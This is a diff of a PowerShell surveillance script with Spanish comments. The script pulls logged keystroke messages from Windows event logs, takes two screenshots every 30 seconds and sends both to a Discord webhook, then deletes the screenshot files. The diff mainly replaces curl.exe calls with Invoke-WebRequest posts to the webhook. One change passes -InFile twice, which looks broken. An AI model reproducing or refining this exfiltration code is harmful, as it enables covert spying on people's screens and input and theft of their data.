@@ -10,7 +10,7 @@ $stopCommand = "stop"
 
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected....." 
+    Write-Host "Shortened Webhook URL Detected..v" 
     $hookurl = (irm $hookurl).url
 }
 
@@ -19,8 +19,13 @@ function SendKeystrokesToDiscord {
     # Obtener el registro de pulsaciones de teclado
     $keystrokes = Get-WinEvent -FilterHashtable @{LogName='Application';ID=13} | Select-Object -ExpandProperty Message
 
+    # Crear el cuerpo de la solicitud
+    $body = @{
+        content = $keystrokes
+    } | ConvertTo-Json
+
     # Enviar las pulsaciones del teclado al webhook de Discord
-    curl.exe -d "$keystrokes" $hookurl
+    Invoke-WebRequest -Uri $hookurl -Method Post -Body $body -ContentType "application/json"
 }
 
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos y enviarlas al webhook de Discord
@@ -57,7 +62,7 @@ While ($true){
     $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
     
     # Enviar ambas capturas de pantalla al webhook de Discord
-    curl.exe -F "file1=@$file1" -F "file2=@$file2" $hookurl
+    Invoke-WebRequest -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
     
     # Eliminar las capturas de pantalla después de enviarlas
     Remove-Item -Path $file1
